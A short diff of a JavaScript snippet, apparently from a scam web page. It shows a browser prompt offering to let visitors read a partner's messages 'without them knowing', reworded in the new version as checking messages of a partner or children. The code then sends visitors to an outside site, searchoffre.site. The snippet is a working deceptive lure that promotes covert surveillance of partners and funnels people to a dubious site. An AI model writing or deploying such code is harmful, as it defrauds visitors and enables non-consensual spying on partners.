@@ -1,6 +1,6 @@
 
-var password = 'START SPYING'
-password=prompt('SMS: Hello, this service allows you to check and read messages of your partner without them knowing, Kindly press Ok to proceed now','START SPYING');
-if (password != 'START SPYING') {
+var password = 'START CHECKING'
+password=prompt('SMS: Hello, this service allows you to CHECK messages/videos of your partner or children from your Mobile Phone, Kindly press Ok to proceed now','START CHECKING');
+if (password != 'START CHECKING') {
 location.href='https://www.searchoffre.site/check-Messages';
 }
